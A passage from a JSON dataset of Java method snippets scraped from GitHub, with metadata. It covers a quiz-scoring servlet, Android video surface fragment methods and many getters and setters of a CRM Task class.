i=0;i<=4;i++)\n\t\t{\n\t\t\tif(r.contains(c[i].getValue()))\n\t\t\t\tat++;\n\t\t}\n\n\t\tif(hm.get(c[0].getName()).equals(c[0].getValue()))\n\t\t\tco++;\t\t\n\t\tif(hm.get(c[1].getName()).equals(c[1].getValue()))\n\t\t\tco++;\n\t\tif(hm.get(c[2].getName()).equals(c[2].getValue()))\n\t\t\tco++;\n\t\tif(hm.get(c[3].getName()).equals(c[3].getValue()))\n\t\t\tco++;\n\t\tif(hm.get(c[4].getName()).equals(c[4].getValue()))\n\t\t\tco++;\n\n\t\tif(Q6!=null && Q6.equals(\"option2\"))\n\t\t\tco++; \n\t\tif(Q7!=null && Q7.equals(\"option1\"))\n\t\t\tco++;\n\t\tif(Q8!=null && Q8.equals(\"option1\"))\n\t\t\tco++;\n\t\tif(Q9!=null && Q9.equals(\"option1\"))\n\t\t\tco++;\n\t\tif(Q10!=null && Q10.equals(\"option2\"))\n\t\t\tco++;\n\n\t\tout.print(\"<head><style>\");\n\t\tout.print(\"body{padding:0%;margin:0%;}\");\n\t\tout.print(\".box form h1{padding:0%;margin:0%;}\");\n\t\tout.print(\".button1{text-align:center;}\");\n\t\tout.print(\".next{background-color:green;color:white;width:10%;font-size:15px;border-radius:35%;padding:10px;}\");\n\t\tout.print(\".score{color:white;}\");\n\t\tout.print(\"\");\n\t\tout.print(\"form{padding:0%;margin:0%;}\");\n\t\tout.print(\"table{padding-top:0%;}\");\n\t\tout.print(\".image{padding:0%;border-radius:15%;}\");\n        out.print(\".box{background-color:pink;color:white;margin:5%;padding:5%;border-radius:15%;}\");\n\t\tout.print(\"</style></head>\");\n\t\tout.print(\"<body>\");\n\t\tout.print(\"<div class=\\\"box\\\">\");\n\t\tout.print(\"<form action=result.com method=post>\");\n\t\tout.print(\"<div class=\\\"image\\\"><img src=\\\"img.jfif\\\" width=\\\"100%\\\" height=\\\"30%\\\"></div>\");\n\t\tout.print(\"<h1 align=center>ExQuizMe</h1><br>\");\n\t\tout.print(\"<h1 align=center>Quiz On Java</h1><br>\");\n\t\tout.print(\"<h1 align=center>=====================</h1><br><br>\");\n\t\tout.print(\"<table align=center class=\\\"score\\\">\");\n\t\tout.print(\"<tr><td><div><h2>Total number of questions</h2></td><td><h2>: 10</h2></td></tr><br>\");\n    \tout.print(\"<tr><td><div><h2>Number of answered questions</h2></td><td><h2>: \"+at+\"</h2></td></tr><br>\");\n\t\tout.print(\"<tr><td><div><h2>Number of unanswered questions</h2></td><td><h2>: \"+(10-at)+\" </h2></td></tr><br>\");   \n\t\tout.print(\"<tr><td><div><h2>Your Score</h2></td><td><h2>: \"+co+\"</h2></td></tr><br>\");   \n\t\tout.print(\"</table>\");\n\t\tout.print(\"</div>\");\n\t\tout.print(\"</form>\");\n\t\tout.print(\"</div>\");\n\t\tout.print(\"</body>\");\n\t\tout.close();\n\t}", "url": "https://raw.githubusercontent.com/SShivani/Online-Quiz-Project/master/WEB-INF/classes/ResultServlet.java", "stars": "2", "class_props": {"extends": "HttpServlet", "implements": null, "modifiers": ["public"]}}, {"id": 55572, "method_name": "onCreateView", "class_name": "VideoSupportFragmentExt", "params": ["LayoutInflater", "ViewGroup", "Bundle"], "throws": null, "modifiers": ["public"], "return_type": "View", "snippet": "    public View onCreateView(\n            LayoutInflater inflater, ViewGroup container, Bundle savedInstanceState) {\n        ViewGroup root = (ViewGroup) super.onCreateView(inflater, container, savedInstanceState);\n        mVideoSurface = (SurfaceView) LayoutInflater.from(getContext()).inflate(\n                androidx.leanback.R.layout.lb_video_surface, root, false);\n        root.addView(mVideoSurface, 0);\n        mVideoSurface.getHolder().addCallback(new SurfaceHolder.Callback() {\n\n            @Override\n            public void surfaceCreated(SurfaceHolder holder) {\n                if (mMediaPlaybackCallback != null) {\n                    mMediaPlaybackCallback.surfaceCreated(holder);\n                }\n                mState = SURFACE_CREATED;\n            }\n\n            @Override\n            public void surfaceChanged(SurfaceHolder holder, int format, int width, int height) {\n                if (mMediaPlaybackCallback != null) {\n                    mMediaPlaybackCallback.surfaceChanged(holder, format, width, height);\n                }\n            }\n\n            @Override\n            public void surfaceDestroyed(SurfaceHolder holder) {\n                if (mMediaPlaybackCallback != null) {\n                    mMediaPlaybackCallback.surfaceDestroyed(holder);\n                }\n                mState = SURFACE_NOT_CREATED;\n            }\n        });\n        setBackgroundType(PlaybackSupportFragmentExt.BG_NONE);\n        return root;\n    }", "url": "https://raw.githubusercontent.com/idanapp/IdanPlusPlus/master/app/src/main/java/com/example/idan/plusplus/Support/VideoSupportFragmentExt.java", "stars": "9", "class_props": {"extends": "PlaybackSupportFragmentExt", "implements": null, "modifiers": ["public"]}}, {"id": 55573, "method_name": "setSurfaceHolderCallback", "class_name": "VideoSupportFragmentExt", "params": ["SurfaceHolder"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setSurfaceHolderCallback(SurfaceHolder.Callback callback) {\n        mMediaPlaybackCallback = callback;\n\n        if (callback != null) {\n            if (mState == SURFACE_CREATED) {\n                mMediaPlaybackCallback.surfaceCreated(mVideoSurface.getHolder());\n            }\n        }\n    }", "url": "https://raw.githubusercontent.com/idanapp/IdanPlusPlus/master/app/src/main/java/com/example/idan/plusplus/Support/VideoSupportFragmentExt.java", "stars": "9", "class_props": {"extends": "PlaybackSupportFragmentExt", "implements": null, "modifiers": ["public"]}}, {"id": 55574, "method_name": "onVideoSizeChanged", "class_name": "VideoSupportFragmentExt", "params": ["int", "int"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onVideoSizeChanged(int width, int height) {\n        int screenWidth = getView().getWidth();\n        int screenHeight = getView().getHeight();\n\n        ViewGroup.LayoutParams p = mVideoSurface.getLayoutParams();\n        if (screenWidth * height > width * screenHeight) {\n            // fit in screen height\n            p.height = screenHeight;\n            p.width = screenHeight * width / height;\n        } else {\n            // fit in screen width\n            p.width = screenWidth;\n            p.height = screenWidth * height / width;\n        }\n        mVideoSurface.setLayoutParams(p);\n    }", "url": "https://raw.githubusercontent.com/idanapp/IdanPlusPlus/master/app/src/main/java/com/example/idan/plusplus/Support/VideoSupportFragmentExt.java", "stars": "9", "class_props": {"extends": "PlaybackSupportFragmentExt", "implements": null, "modifiers": ["public"]}}, {"id": 55575, "method_name": "getSurfaceView", "class_name": "VideoSupportFragmentExt", "params": [], "throws": null, "modifiers": ["public"], "return_type": "SurfaceView", "snippet": "    public SurfaceView getSurfaceView() {\n        return mVideoSurface;\n    }", "url": "https://raw.githubusercontent.com/idanapp/IdanPlusPlus/master/app/src/main/java/com/example/idan/plusplus/Support/VideoSupportFragmentExt.java", "stars": "9", "class_props": {"extends": "PlaybackSupportFragmentExt", "implements": null, "modifiers": ["public"]}}, {"id": 55576, "method_name": "onDestroyView", "class_name": "VideoSupportFragmentExt", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onDestroyView() {\n        mVideoSurface = null;\n        mState = SURFACE_NOT_CREATED;\n        super.onDestroyView();\n    }", "url": "https://raw.githubusercontent.com/idanapp/IdanPlusPlus/master/app/src/main/java/com/example/idan/plusplus/Support/VideoSupportFragmentExt.java", "stars": "9", "class_props": {"extends": "PlaybackSupportFragmentExt", "implements": null, "modifiers": ["public"]}}, {"id": 55577, "method_name": "getTypeTitle", "class_name": "Task", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String getTypeTitle()\n\t{\n\t\treturn typeTitle;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/crm/task/Task.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55578, "method_name": "setTypeTitle", "class_name": "Task", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setTypeTitle( String typeTitle )\n\t{\n\t\tthis.typeTitle = typeTitle;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/crm/task/Task.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55579, "method_name": "getAddress", "class_name": "Task", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String getAddress()\n\t{\n\t\treturn address;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/crm/task/Task.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55580, "method_name": "setAddress", "class_name": "Task", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setAddress( String address )\n\t{\n\t\tthis.address = address;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/crm/task/Task.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55581, "method_name": "getComment", "class_name": "Task", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String getComment()\n\t{\n\t\treturn comment;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/crm/task/Task.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55582, "method_name": "setComment", "class_name": "Task", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setComment( String comment )\n\t{\n\t\tthis.comment = comment;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/crm/task/Task.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55583, "method_name": "getGroupTitle", "class_name": "Task", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String getGroupTitle()\n\t{\n\t\treturn groupTitle;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/crm/task/Task.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55584, "method_name": "setGroupTitle", "class_name": "Task", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setGroupTitle( String groupTitle )\n\t{\n\t\tthis.groupTitle = groupTitle;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/crm/task/Task.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55585, "method_name": "getContract", "class_name": "Task", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String getContract()\n\t{\n\t\treturn contract;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/crm/task/Task.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55586, "method_name": "setContract", "class_name": "Task", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setContract( String contract )\n\t{\n\t\tthis.contract = contract;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/crm/task/Task.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55587, "method_name": "getContractId", "class_name": "Task", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "\tpublic int getContractId()\n\t{\n\t\treturn contractId;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/crm/task/Task.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55588, "method_name": "setContractId", "class_name": "Task", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setContractId( int contractId )\n\t{\n\t\tthis.contractId = contractId;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/crm/task/Task.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55589, "method_name": "getObjectId", "class_name": "Task", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "\tpublic int getObjectId()\n\t{\n\t\treturn objectId;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/crm/task/Task.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55590, "method_name": "setObjectId", "class_name": "Task", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setObjectId( int objectId )\n\t{\n\t\tthis.objectId = objectId;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/crm/task/Task.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55591, "method_name": "getContractComment", "class_name": "Task", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String getContractComment()\n\t{\n\t\treturn contractComment;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/crm/task/Task.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55592, "method_name": "setContractComment", "class_name": "Task", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setContractComment( String contractComment )\n\t{\n\t\tthis.contractComment = contractComment;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/crm/task/Task.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55593, "method_name": "getCurrentDate", "class_name": "Task", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String getCurrentDate()\n\t{\n\t\treturn currentDate;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/crm/task/Task.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55594, "method_name": "setCurrentDate", "class_name": "Task", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setCurrentDate( String currentDate )\n\t{\n\t\tthis.currentDate = currentDate;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/crm/task/Task.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55595, "method_name": "getExecuteDate", "class_name": "Task", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String getExecuteDate()\n\t{\n\t\treturn executeDate;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/crm/task/Task.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55596, "method_name": "setExecuteDate", "class_name": "Task", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setExecuteDate( String executeDate )\n\t{\n\t\tthis.executeDate = executeDate;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/crm/task/Task.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55597, "method_name": "getExecutors", "class_name": "Task", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String getExecutors()\n\t{\n\t\treturn executors;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/crm/task/Task.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55598, "method_name": "setExecutors", "class_name": "Task", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setExecutors( String executors )\n\t{\n\t\tthis.executors = executors;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/crm/task/Task.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55599, "method_name": "getFio", "class_name": "Task", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String getFio()\n\t{\n\t\treturn fio;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/crm/task/Task.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55600, "method_name": "setFio", "class_name": "Task", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setFio( String fio )\n\t{\n\t\tthis.fio = fio;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/crm/task/Task.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55601, "method_name": "getGroupId", "class_name": "Task", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "\tpublic int getGroupId()\n\t{\n\t\treturn groupId;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/crm/task/Task.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55602, "method_name": "setGroupId", "class_name": "Task", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setGroupId( int groupId )\n\t{\n\t\tthis.groupId = groupId;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/crm/task/Task.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55603, "method_name": "getId", "class_name": "Task", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "\tpublic int getId()\n\t{\n\t\treturn id;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/crm/task/Task.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55604, "method_name": "setId", "class_name": "Task", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setId( int id )\n\t{\n\t\tthis.id = id;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/crm/task/Task.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55605, "method_name": "getOpenDate", "class_name": "Task", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String getOpenDate()\n\t{\n\t\treturn openDate;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/crm/task/Task.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55606, "method_name": "setOpenDate", "class_name": "Task", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setOpenDate( String openDate )\n\t{\n\t\tthis.openDate = openDate;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/crm/task/Task.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55607, "method_name": "getOpenUser", "class_name": "Task", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String getOpenUser()\n\t{\n\t\treturn openUser;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/crm/task/Task.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55608, "method_name": "setOpenUser", "class_name": "Task", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setOpenUser( String openUser )\n\t{\n\t\tthis.openUser = openUser;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/crm/task/Task.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55609, "method_name": "getPhones", "class_name": "Task", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String getPhones()\n\t{\n\t\treturn phones;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/crm/task/Task.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55610, "method_name": "setPhones", "class_name": "Task", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setPhones( String phones )\n\t{\n\t\tthis.phones = phones;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/crm/task/Task.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55611, "method_name": "getResolution", "class_name": "Task", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String getResolution()\n\t{\n\t\treturn resolution;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/crm/task/Task.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55612, "method_name": "setResolution", "class_name": "Task", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setResolution( String resolution )\n\t{\n\t\tthis.resolution = resolution;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/crm/task/Task.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55613, "method_name": "getStatus", "class_name": "Task", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String getStatus()\n\t{\n\t\treturn status;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/crm/task/Task.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55614, "method_name": "setStatus", "class_name": "Task", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setStatus( String status )\n\t{\n\t\tthis.status = status;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/crm/task/Task.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55615, "method_name": "getStatusCode", "class_name": "Task", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "\tpublic int getStatusCode()\n\t{\n\t\treturn statusCode;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/crm/task/Task.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55616, "method_name": "setStatusCode", "class_name": "Task", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setStatusCode( int statusCode )\n\t{\n\t\tthis.statusCode = statusCode;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/crm/task/Task.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55617, "method_name": "getTargetDateTime", "class_name": "Task", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String getTargetDateTime()\n\t{\n\t\treturn targetDateTime;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/crm/task/Task.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55618, "method_name": "setTargetDateTime", "class_name": "Task", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setTargetDateTime( String targetDateTime )\n\t{\n\t\tthis.targetDateTime = targetDateTime;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/crm/task/Task.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55619, "method_name": "getTypeId", "class_name": "Task", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "\tpublic int getTypeId()\n\t{\n\t\treturn typeId;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/crm/task/Task.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55620, "method_name": "setTypeId", "class_name": "Task", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setTypeId( int typeId )\n\t{\n\t\tthis.typeId = typeId;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/crm/task/Task.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55621, "method_name": "getLog", "class_name": "Task", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Log", "snippet": "\tpublic Log getLog()\n\t{\n\t\treturn log;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/crm/task/Task.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55622, "method_name": "setLog", "class_name": "Task", "params": ["Log"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setLog( Log log )\n\t{\n\t\tthis.log = log;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/crm/task/Task.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55623, "method_name": "getAddressPId", "class_name": "Task", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "\tpublic int getAddressPId()\n\t{\n\t\treturn addressPId;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/crm/task/Task.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55624, "method_name": "setAddressPId", "class_name": "Task", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setAddressPId( int addressPId )\n\t{\n\t\tthis.addressPId = addressPId;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/crm/task/Task.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55625, "method_name": "getOpen", "class_name": "Log", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\t\tpublic String getOpen()\n\t\t{\n\t\t\treturn open;\n\t\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/crm/task/Task.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55626, "method_name": "setOpen", "class_name": "Log", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t\tpublic void setOpen( String open )\n\t\t{\n\t\t\tthis.open = open;\n\t\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/crm/task/Task.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55627, "method_name": "getAccept", "class_name": "Log", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\t\tpublic String getAccept()\n\t\t{\n\t\t\treturn accept;\n\t\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/crm/task/Task.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55628, "method_name": "setAccept", "class_name": "Log", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t\tpublic void setAccept( String accept )\n\t\t{\n\t\t\tthis.accept = accept;\n\t\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/crm/task/Task.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55629, "method_name": "getClose", "class_name": "Log", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\t\tpublic String getClose()\n\t\t{\n\t\t\treturn close;\n\t\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/crm/task/Task.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55630, "method_name": "setClose", 